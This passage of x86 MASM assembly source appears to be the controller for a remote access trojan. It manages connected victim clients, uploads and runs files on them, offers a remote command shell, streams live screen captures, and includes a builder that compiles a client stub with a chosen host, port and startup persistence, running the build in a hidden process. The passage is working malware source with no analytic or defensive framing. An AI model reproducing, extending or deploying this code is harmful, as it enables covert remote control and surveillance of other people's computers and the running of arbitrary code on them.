    cmp (MasonClient ptr [edi]).active, 0
    je _fpsk
    mov eax, cnt
    cmp eax, lvIdx
    je _fpf
    inc cnt
_fpsk:
    add edi, sizeof MasonClient
    inc ecx
    jmp _fpi
_fpf:
    mov eax, ecx
    ret
_fpn:
    mov eax, -1
    ret
FindPoolIndex endp

RemoveClient proc uses esi, poolIdx:DWORD
    mov eax, poolIdx
    mov ecx, sizeof MasonClient
    mul ecx
    lea esi, pool
    add esi, eax
    mov eax, (MasonClient ptr [esi]).sock
    invoke closesocket, eax
    mov (MasonClient ptr [esi]).active, 0
    dec nClients
    invoke UpdateStatusBar
    ret
RemoveClient endp

DoRunFile proc uses esi ebx
    LOCAL ofn:OPENFILENAMEA
    LOCAL hFile:DWORD
    LOCAL fSize:DWORD
    LOCAL pFileBuf:DWORD
    LOCAL dwRead:DWORD
    LOCAL sk:DWORD
    LOCAL pi:DWORD

    .if nSel == -1
        invoke MessageBoxA, hMain, addr szNoSel, addr szApp, MB_ICONERROR
        ret
    .endif

    invoke FindPoolIndex, nSel
    .if eax == -1
        invoke MessageBoxA, hMain, addr szNoSel, addr szApp, MB_ICONERROR
        ret
    .endif
    mov pi, eax

    push edi
    push ecx
    lea edi, ofn
    mov ecx, sizeof OPENFILENAMEA
    xor al, al
    rep stosb
    pop ecx
    pop edi
    mov fPath[0], 0
    mov ofn.lStructSize, sizeof OPENFILENAMEA
    push hMain
    pop ofn.hwndOwner
    mov ofn.lpstrFilter, offset szFFilter
    mov ofn.lpstrFile, offset fPath
    mov ofn.nMaxFile, MAX_PATH
    mov ofn.Flags, OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST or OFN_HIDEREADONLY
    mov ofn.nFilterIndex, 1
    invoke GetOpenFileNameA, addr ofn
    .if eax == 0
        ret
    .endif

    mov eax, pi
    mov ecx, sizeof MasonClient
    mul ecx
    lea esi, pool
    add esi, eax
    mov eax, (MasonClient ptr [esi]).active
    .if eax == 0
        invoke MessageBoxA, hMain, addr szNoSel, addr szApp, MB_ICONERROR
        ret
    .endif
    mov eax, (MasonClient ptr [esi]).sock
    mov sk, eax

    invoke NetSend, sk, addr szCmdUR

    invoke NetRecv, sk, addr rxBuf, 8192
    .if eax <= 0
        invoke MessageBoxA, hMain, addr szTimeoutMsg, addr szApp, MB_ICONERROR
        ret
    .endif

    invoke lstrlenA, addr fPath
    mov ecx, eax
    lea esi, fPath
    add esi, ecx
@@scanBack:
    cmp esi, offset fPath
    jbe @@noSlash
    dec esi
    cmp byte ptr [esi], 5Ch
    je @@foundSlash
    jmp @@scanBack
@@foundSlash:
    inc esi
    jmp @@gotName
@@noSlash:
    lea esi, fPath
@@gotName:
    push esi
    invoke lstrlenA, esi
    pop esi
    invoke NetSendRaw, sk, esi, eax

    invoke CreateFileA, addr fPath, GENERIC_READ, FILE_SHARE_READ, \
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax == INVALID_HANDLE_VALUE
        invoke MessageBoxA, hMain, addr szFileReadErr, addr szApp, MB_ICONERROR
        ret
    .endif
    mov hFile, eax

    invoke GetFileSize, hFile, NULL
    mov fSize, eax

    invoke GlobalAlloc, GMEM_FIXED, fSize
    mov pFileBuf, eax
    .if eax == 0
        invoke CloseHandle, hFile
        invoke MessageBoxA, hMain, addr szFileReadErr, addr szApp, MB_ICONERROR
        ret
    .endif

    invoke ReadFile, hFile, pFileBuf, fSize, addr dwRead, NULL
    invoke CloseHandle, hFile

    invoke NetSendRaw, sk, pFileBuf, fSize
    invoke GlobalFree, pFileBuf

    invoke NetRecv, sk, addr rxBuf, 8192
    .if eax > 0
        invoke MessageBoxA, hMain, addr szRunOK, addr szApp, MB_ICONINFORMATION
    .else
        invoke MessageBoxA, hMain, addr szRunFail, addr szApp, MB_ICONERROR
    .endif
    ret
DoRunFile endp

DoDisconnect proc uses esi
    LOCAL pi:DWORD
    .if nSel == -1
        invoke MessageBoxA, hMain, addr szNoSel, addr szApp, MB_ICONERROR
        ret
    .endif
    invoke MessageBoxA, hMain, addr szDCAsk, addr szApp, MB_YESNO or MB_ICONQUESTION
    .if eax != IDYES
        ret
    .endif

    invoke FindPoolIndex, nSel
    .if eax == -1
        ret
    .endif
    mov pi, eax

    mov eax, pi
    mov ecx, sizeof MasonClient
    mul ecx
    lea esi, pool
    add esi, eax
    mov eax, (MasonClient ptr [esi]).sock
    invoke NetSend, eax, addr szCmdStop
    invoke RemoveClient, pi
    invoke SendMessageA, hLV, LVM_DELETEITEM, nSel, 0
    mov nSel, -1
    ret
DoDisconnect endp

NukeAllClients proc uses esi edi
    lea edi, pool
    xor ecx, ecx
_nl:
    cmp ecx, MAX_CLIENTS
    jge _nd
    mov eax, (MasonClient ptr [edi]).active
    .if eax != 0
        push ecx
        mov eax, (MasonClient ptr [edi]).sock
        invoke closesocket, eax
        pop ecx
        mov (MasonClient ptr [edi]).active, 0
    .endif
    add edi, sizeof MasonClient
    inc ecx
    jmp _nl
_nd:
    mov nClients, 0
    ret
NukeAllClients endp

StaleCheck proc
    LOCAL idx:DWORD
    LOCAL removed:DWORD
    LOCAL pCli:DWORD
    LOCAL cSock:DWORD
    LOCAL rSet:fd_set
    LOCAL tv:timeval
    LOCAL selRes:DWORD
    LOCAL pingB[4]:BYTE
    LOCAL socErr:DWORD
    LOCAL errLen:DWORD

    cmp bRunning, 0
    je _sc_done

    mov removed, 0
    mov idx, 0
_sc_loop:
    cmp idx, MAX_CLIENTS
    jge _sc_rebuild

    mov eax, idx
    mov ecx, sizeof MasonClient
    mul ecx
    lea ecx, pool
    add eax, ecx
    mov pCli, eax

    mov ecx, pCli
    cmp (MasonClient ptr [ecx]).active, 0
    je _sc_next

    mov ecx, pCli
    mov eax, (MasonClient ptr [ecx]).sock
    mov cSock, eax

    mov socErr, 0
    mov errLen, 4
    invoke getsockopt, cSock, SOL_SOCKET, SO_ERROR, addr socErr, addr errLen
    .if eax == SOCKET_ERROR
        jmp _sc_dead
    .endif
    .if socErr != 0
        jmp _sc_dead
    .endif

    mov rSet.fd_count, 1
    mov eax, cSock
    mov rSet.fd_array[0], eax
    mov tv.tv_sec, 0
    mov tv.tv_usec, 0

    invoke select, 0, addr rSet, NULL, NULL, addr tv
    mov selRes, eax

    cmp selRes, SOCKET_ERROR
    je _sc_dead

    cmp selRes, 0
    je _sc_next

    invoke recv, cSock, addr pingB, 1, MSG_PEEK
    cmp eax, 0
    je _sc_dead
    cmp eax, SOCKET_ERROR
    jne _sc_next
    invoke WSAGetLastError
    cmp eax, 10035
    je _sc_next

_sc_dead:
    invoke closesocket, cSock
    mov ecx, pCli
    mov (MasonClient ptr [ecx]).active, 0
    dec nClients
    mov removed, 1

_sc_next:
    inc idx
    jmp _sc_loop

_sc_rebuild:
    cmp removed, 0
    je _sc_done

    invoke SendMessageA, hLV, LVM_DELETEALLITEMS, 0, 0
    mov idx, 0
_sc_re:
    cmp idx, MAX_CLIENTS
    jge _sc_done

    mov eax, idx
    mov ecx, sizeof MasonClient
    mul ecx
    lea ecx, pool
    add eax, ecx
    mov pCli, eax

    mov ecx, pCli
    cmp (MasonClient ptr [ecx]).active, 0
    je _sc_rn
    invoke PushListView, idx
_sc_rn:
    inc idx
    jmp _sc_re

_sc_done:
    invoke UpdateStatusBar
    ret
StaleCheck endp

BuilderProc proc hDlg:DWORD, uMsg:DWORD, wParam:DWORD, lParam:DWORD
    LOCAL wId:DWORD
    .if uMsg == WM_INITDIALOG
        invoke SetDlgItemTextA, hDlg, IDC_EDIT_HOST, addr szDefHost
        invoke SetDlgItemTextA, hDlg, IDC_EDIT_PORT, addr szDefPort
        mov eax, TRUE
        ret
    .elseif uMsg == WM_COMMAND
        movzx eax, word ptr wParam
        mov wId, eax
        .if wId == IDC_BTN_BUILD
            invoke RunBuild, hDlg
        .elseif wId == IDCANCEL
            invoke EndDialog, hDlg, 0
        .endif
    .elseif uMsg == WM_CLOSE
        invoke EndDialog, hDlg, 0
    .endif
    xor eax, eax
    ret
BuilderProc endp

RunBuild proc hDlg:DWORD
    LOCAL bS:DWORD
    LOCAL bD:DWORD
    LOCAL sinfo:STARTUPINFO_A
    LOCAL pinfo:PROCESS_INFO

    invoke GetDlgItemTextA, hDlg, IDC_EDIT_HOST, addr bHost, 256
    invoke GetDlgItemTextA, hDlg, IDC_EDIT_PORT, addr bPort, 32
    invoke IsDlgButtonChecked, hDlg, IDC_CHK_STARTUP
    mov bS, eax
    invoke IsDlgButtonChecked, hDlg, IDC_CHK_SHELLDIR
    mov bD, eax

    invoke CreateDirectoryA, addr szOutputDir, NULL
    invoke GenStub, bS, bD
    invoke ExtractResource, IDR_STUB_ASM, addr szStubDst
    invoke ExtractResource, IDR_STUB_RC, addr szRcDst
    invoke ExtractResource, IDR_STUB_MAN, addr szManDst
    invoke WriteBuildBat

    push edi
    push ecx
    lea edi, sinfo
    mov ecx, sizeof STARTUPINFO_A
    xor al, al
    rep stosb
    pop ecx
    pop edi
    mov sinfo.cb_, sizeof STARTUPINFO_A
    mov sinfo.wShow, SW_HIDE
    mov sinfo.dwFlg, STARTF_USESHOWWINDOW

    invoke CreateProcessA, NULL, addr szBuildCmd, NULL, NULL, FALSE, 0, NULL, NULL, addr sinfo, addr pinfo
    .if eax != 0
        invoke WaitForSingleObject, pinfo.hProc, 30000
        invoke CloseHandle, pinfo.hProc
        invoke CloseHandle, pinfo.hThr
    .endif

    invoke GetFileAttributesA, addr szStubExe
    .if eax == -1
        invoke MessageBoxA, hDlg, addr szBuildFail, addr szApp, MB_ICONERROR
    .else
        invoke CopyFileA, addr szStubExe, addr szFinalExe, FALSE
        invoke DeleteFileA, addr szStubExe
        invoke DeleteFileA, addr szClean1
        invoke DeleteFileA, addr szClean2
        invoke DeleteFileA, addr szClean3
        invoke DeleteFileA, addr szClean4
        invoke DeleteFileA, addr szClean5
        invoke DeleteFileA, addr szClean6
        invoke DeleteFileA, addr szClean7
        invoke DeleteFileA, addr szClean8
        invoke RemoveDirectoryA, addr szOutputDir
        invoke wsprintfA, addr buf, addr szBuildOK, addr szFinalExe
        invoke MessageBoxA, hDlg, addr buf, addr szApp, MB_ICONINFORMATION
    .endif
    ret
RunBuild endp

GenStub proc bS:DWORD, bD:DWORD
    LOCAL hF:DWORD

    invoke CreateFileA, addr szHostPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax == INVALID_HANDLE_VALUE
        ret
    .endif
    mov hF, eax
    invoke wsprintfA, addr buf, addr szHostFmt, addr bHost
    invoke StubWrite, hF, addr buf
    invoke CloseHandle, hF

    invoke CreateFileA, addr szCfgPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax == INVALID_HANDLE_VALUE
        ret
    .endif
    mov hF, eax
    invoke wsprintfA, addr buf, addr szCfgFmtPort, addr bPort
    invoke StubWrite, hF, addr buf
    invoke wsprintfA, addr buf, addr szCfgFmtPS, bS
    invoke StubWrite, hF, addr buf
    invoke wsprintfA, addr buf, addr szCfgFmtPD, bD
    invoke StubWrite, hF, addr buf
    invoke CloseHandle, hF
    ret
GenStub endp

WriteBuildBat proc
    LOCAL hF:DWORD
    invoke CreateFileA, addr szBuildBat, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax == INVALID_HANDLE_VALUE
        ret
    .endif
    mov hF, eax
    invoke StubWrite, hF, addr szBatContent
    invoke CloseHandle, hF
    ret
WriteBuildBat endp

StubWrite proc hF:DWORD, pS:DWORD
    LOCAL dw_:DWORD
    invoke lstrlenA, pS
    mov ecx, eax
    invoke WriteFile, hF, pS, ecx, addr dw_, NULL
    ret
StubWrite endp

StartLiveMonitor proc uses esi, ci:DWORD
    LOCAL wc:WNDCLASSEX

    .if ci == -1
        invoke MessageBoxA, hMain, addr szNoSel, addr szApp, MB_ICONERROR
        ret
    .endif

    invoke FindPoolIndex, ci
    .if eax == -1
        invoke MessageBoxA, hMain, addr szNoSel, addr szApp, MB_ICONERROR
        ret
    .endif
    mov nLiveMonIdx, eax

    .if pMonBuf == 0
        invoke VirtualAlloc, NULL, CAP_TOTAL + 4096, 1000h or 2000h, 04h
        mov pMonBuf, eax
    .endif

    .if bMonClassReg == 0
        mov wc.cbSize, sizeof WNDCLASSEX
        mov wc.style, CS_HREDRAW or CS_VREDRAW
        mov wc.lpfnWndProc, offset MonitorWndProc
        mov wc.cbClsExtra, 0
        mov wc.cbWndExtra, 0
        push hInst
        pop wc.hInstance
        invoke LoadIconA, hInst, IDI_MAINICON
        mov wc.hIcon, eax
        mov wc.hIconSm, eax
        invoke LoadCursorA, NULL, IDC_ARROW
        mov wc.hCursor, eax
        invoke GetStockObject, BLACK_BRUSH
        mov wc.hbrBackground, eax
        mov wc.lpszMenuName, NULL
        mov wc.lpszClassName, offset szMonClass
        invoke RegisterClassExA, addr wc
        mov bMonClassReg, 1
    .endif

    mov bLiveMon, 1
    invoke CreateWindowExA, \
        0, addr szMonClass, addr szMonTitle, \
        WS_OVERLAPPEDWINDOW or WS_VISIBLE, \
        CW_USEDEFAULT, CW_USEDEFAULT, 820, 500, \
        hMain, NULL, hInst, NULL
    mov hMonWnd, eax

    invoke CreateThread, NULL, 0, addr LiveMonitorThread, NULL, 0, addr dwMonTID
    mov hMonThread, eax
    ret
StartLiveMonitor endp

MonitorWndProc proc hW:DWORD, uMsg:DWORD, wP:DWORD, lP:DWORD
    LOCAL rc:RECT
    LOCAL ps[68]:BYTE
    LOCAL hDC:DWORD
    LOCAL pBih:DWORD
    LOCAL pPix:DWORD

    .if uMsg == WM_USER_FRAME
        invoke InvalidateRect, hW, NULL, FALSE
        xor eax, eax
        ret
    .elseif uMsg == WM_PAINT
        invoke BeginPaint, hW, addr ps
        mov hDC, eax
        invoke GetClientRect, hW, addr rc
        .if nMonBufSz >= 40
            mov eax, pMonBuf
            mov pBih, eax
            add eax, 40
            mov pPix, eax
            invoke StretchDIBits, hDC, \
                0, 0, rc.right, rc.bottom, \
                0, 0, CAP_W, CAP_H, \
                pPix, pBih, 0, 00CC0020h
        .endif
        invoke EndPaint, hW, addr ps
        xor eax, eax
        ret
    .elseif uMsg == WM_CLOSE
        mov bLiveMon, 0
        invoke DestroyWindow, hW
        mov hMonWnd, 0
        xor eax, eax
        ret
    .elseif uMsg == WM_DESTROY
        mov bLiveMon, 0
        xor eax, eax
        ret
    .else
        invoke DefWindowProcA, hW, uMsg, wP, lP
        ret
    .endif
    xor eax, eax
    ret
MonitorWndProc endp

LiveMonitorThread proc uses esi ebx, lpP:DWORD
    LOCAL sk:DWORD

_lmt:
    cmp bLiveMon, 0
    je _lmt_exit

    mov eax, nLiveMonIdx
    mov ecx, sizeof MasonClient
    mul ecx
    lea esi, pool
    add esi, eax

    mov eax, (MasonClient ptr [esi]).active
    .if eax == 0
        jmp _lmt_exit
    .endif

    mov eax, (MasonClient ptr [esi]).sock
    mov sk, eax

    invoke NetSend, sk, addr szCmdScreenLive

    invoke NetRecv, sk, pMonBuf, CAP_TOTAL + 4096
    .if eax > 40
        mov nMonBufSz, eax
        .if hMonWnd != 0
            invoke PostMessageA, hMonWnd, WM_USER_FRAME, 0, 0
        .endif
    .endif

    invoke Sleep, 150
    jmp _lmt

_lmt_exit:
    xor eax, eax
    ret
LiveMonitorThread endp

RegisterShellClass proc
    LOCAL wc:WNDCLASSEX

    .if bShellClassReg != 0
        ret
    .endif

    mov wc.cbSize, sizeof WNDCLASSEX
    mov wc.style, CS_HREDRAW or CS_VREDRAW
    mov wc.lpfnWndProc, offset ShellWndProc
    mov wc.cbClsExtra, 0
    mov wc.cbWndExtra, 0
    push hInst
    pop wc.hInstance
    invoke LoadIconA, hInst, IDI_MAINICON
    mov wc.hIcon, eax
    mov wc.hIconSm, eax
    invoke LoadCursorA, NULL, IDC_ARROW
    mov wc.hCursor, eax
    invoke GetStockObject, WHITE_BRUSH
    mov wc.hbrBackground, eax
    mov wc.lpszMenuName, NULL
    mov wc.lpszClassName, offset szShellClass
    invoke RegisterClassExA, addr wc
    mov bShellClassReg, 1
    ret
RegisterShellClass endp

ShowShellWnd proc
    .if nSel == -1
        invoke MessageBoxA, hMain, addr szNoSel, addr szApp, MB_ICONERROR
        ret
    .endif
    invoke FindPoolIndex, nSel
    .if eax == -1
        invoke MessageBoxA, hMain, addr szNoSel, addr szApp, MB_ICONERROR
        ret
    .endif
    mov nShellIdx, eax

    invoke RegisterShellClass

    invoke CreateWindowExA, \
        0, addr szShellClass, addr szShellTitle, \
        WS_OVERLAPPEDWINDOW or WS_VISIBLE, \
        CW_USEDEFAULT, CW_USEDEFAULT, 700, 500, \
        hMain, NULL, hInst, NULL
    mov hShellWnd, eax
    ret
ShowShellWnd endp

ShellWndProc proc uses esi, hW:DWORD, uMsg:DWORD, wP:DWORD, lP:DWORD
    LOCAL rc:RECT
    LOCAL wId:DWORD
    LOCAL wNot:DWORD
    LOCAL sk:DWORD
    LOCAL tLen:DWORD

    .if uMsg == WM_CREATE
        invoke GetClientRect, hW, addr rc
        mov eax, rc.bottom
        sub eax, 30
        invoke CreateWindowExA, \
            WS_EX_CLIENTEDGE, addr szEditClass, NULL, \
            WS_CHILD or WS_VISIBLE or WS_VSCROLL or WS_HSCROLL \
            or ES_MULTILINE or ES_AUTOVSCROLL or ES_AUTOHSCROLL \
            or ES_READONLY or ES_WANTRETURN, \
            0, 0, rc.right, eax, \
            hW, IDC_SHELL_OUT, hInst, NULL
        mov hShellOut, eax

        mov eax, rc.bottom
        sub eax, 25
        mov ecx, rc.right
        sub ecx, 60
        invoke CreateWindowExA, \
            WS_EX_CLIENTEDGE, addr szEditClass, NULL, \
            WS_CHILD or WS_VISIBLE or WS_TABSTOP \
            or ES_AUTOHSCROLL, \
            0, eax, ecx, 25, \
            hW, IDC_SHELL_IN, hInst, NULL
        mov hShellIn, eax

        mov eax, rc.bottom
        sub eax, 25
        mov ecx, rc.right
        sub ecx, 60
        invoke CreateWindowExA, \
            0, addr szBtnClass, addr szShellSend, \
            WS_CHILD or WS_VISIBLE or WS_TABSTOP \
            or BS_DEFPUSHBUTTON, \
            ecx, eax, 60, 25, \
            hW, IDC_SHELL_BTN, hInst, NULL
        mov hShellBtn, eax

        invoke SetFocus, hShellIn
        xor eax, eax
        ret

    .elseif uMsg == WM_SIZE
        invoke GetClientRect, hW, addr rc
        mov eax, rc.bottom
        sub eax, 30
        invoke MoveWindow, hShellOut, 0, 0, rc.right, eax, TRUE
        mov eax, rc.bottom
        sub eax, 25
        mov ecx, rc.right
        sub ecx, 60
        invoke MoveWindow, hShellIn, 0, eax, ecx, 25, TRUE
        mov eax, rc.bottom
        sub eax, 25
        mov ecx, rc.right
        sub ecx, 60
        invoke MoveWindow, hShellBtn, ecx, eax, 60, 25, TRUE
        xor eax, eax
        ret

    .elseif uMsg == WM_COMMAND
        movzx eax, word ptr wP
        mov wId, eax
        mov eax, wP
        shr eax, 16
        mov wNot, eax

        .if wId == IDC_SHELL_BTN && wNot == BN_CLICKED
            jmp _shell_exec
        .elseif wId == IDOK
            jmp _shell_exec
        .endif
        xor eax, eax
        ret

    .elseif uMsg == WM_CLOSE
        invoke DestroyWindow, hW
        xor eax, eax
        ret

    .elseif uMsg == WM_DESTROY
        mov hShellWnd, 0
        mov hShellOut, 0
        mov hShellIn, 0
        mov hShellBtn, 0
        xor eax, eax
        ret

    .else
        invoke DefWindowProcA, hW, uMsg, wP, lP
        ret
    .endif
    xor eax, eax
    ret

_shell_exec:
    invoke GetWindowTextA, hShellIn, addr shellCmd, 1024
    .if eax == 0
        xor eax, eax
        ret
    .endif

    mov eax, nShellIdx
    mov ecx, sizeof MasonClient
    mul ecx
    lea esi, pool
    add esi, eax
    mov eax, (MasonClient ptr [esi]).active
    .if eax == 0
        invoke MessageBoxA, hW, addr szTimeoutMsg, addr szApp, MB_ICONERROR
        xor eax, eax
        ret
    .endif
    mov eax, (MasonClient ptr [esi]).sock
    mov sk, eax

    invoke GetWindowTextLengthA, hShellOut
    mov tLen, eax
    invoke SendMessageA, hShellOut, EM_SETSEL, tLen, tLen
    invoke SendMessageA, hShellOut, EM_REPLACESEL, 0, addr szShellPrompt
    invoke GetWindowTextLengthA, hShellOut
    mov tLen, eax
    invoke SendMessageA, hShellOut, EM_SETSEL, tLen, tLen
    invoke SendMessageA, hShellOut, EM_REPLACESEL, 0, addr shellCmd
    invoke GetWindowTextLengthA, hShellOut
    mov tLen, eax
    invoke SendMessageA, hShellOut, EM_SETSEL, tLen, tLen
    invoke SendMessageA, hShellOut, EM_REPLACESEL, 0, addr szNewLine

    invoke NetSend, sk, addr shellCmd

    invoke NetRecv, sk, addr shellRx, 65536
    .if eax > 0
        invoke GetWindowTextLengthA, hShellOut
        mov tLen, eax
        invoke SendMessageA, hShellOut, EM_SETSEL, tLen, tLen
        invoke SendMessageA, hShellOut, EM_REPLACESEL, 0, addr shellRx
        invoke GetWindowTextLengthA, hShellOut
        mov tLen, eax
        invoke SendMessageA, hShellOut, EM_SETSEL, tLen, tLen
        invoke SendMessageA, hShellOut, EM_REPLACESEL, 0, addr szNewLine
    .endif

    invoke SetWindowTextA, hShellIn, NULL
    invoke SetFocus, hShellIn
    xor eax, eax
    ret
ShellWndProc endp

NetSendRaw proc uses ebx, sSock:DWORD, pBuf:DWORD, nLen:DWORD
    LOCAL hdr[4]:BYTE
    LOCAL sent:DWORD

    mov eax, nLen
    shr eax, 24
    mov hdr[0], al
    mov eax, nLen
    shr eax, 16
    mov hdr[1], al
    mov eax, nLen
    shr eax, 8
    mov hdr[2], al
    mov eax, nLen
    mov hdr[3], al
    invoke send, sSock, addr hdr, 4, 0
    .if eax == SOCKET_ERROR
        xor eax, eax
        ret
    .endif
    mov sent, 0
_nsr_loop:
    mov eax, nLen
    sub eax, sent
    .if eax <= 0
        mov eax, 1
        ret
    .endif
    mov ebx, eax
    .if ebx > 32768
        mov ebx, 32768
    .endif
    mov eax, pBuf
    add eax, sent
    invoke send, sSock, eax, ebx, 0
    .if eax == SOCKET_ERROR
        xor eax, eax
        ret
    .endif
    add sent, eax
    jmp _nsr_loop
NetSendRaw endp

ExtractResource proc resId:DWORD, pPath:DWORD
    LOCAL hRes:DWORD
    LOCAL hLoad:DWORD
    LOCAL pData:DWORD
    LOCAL sz_:DWORD
    LOCAL hF:DWORD
    LOCAL dw_:DWORD

    invoke FindResourceA, hInst, resId, RT_RCDATA
    .if eax == 0
        ret
    .endif
    mov hRes, eax
    invoke SizeofResource, hInst, hRes
    mov sz_, eax
    invoke LoadResource, hInst, hRes
    mov hLoad, eax
    invoke LockResource, hLoad
    mov pData, eax

    invoke CreateFileA, pPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax == INVALID_HANDLE_VALUE
        ret
    .endif
    mov hF, eax
    invoke WriteFile, hF, pData, sz_, addr dw_, NULL
    invoke CloseHandle, hF
    ret
ExtractResource endp

end start
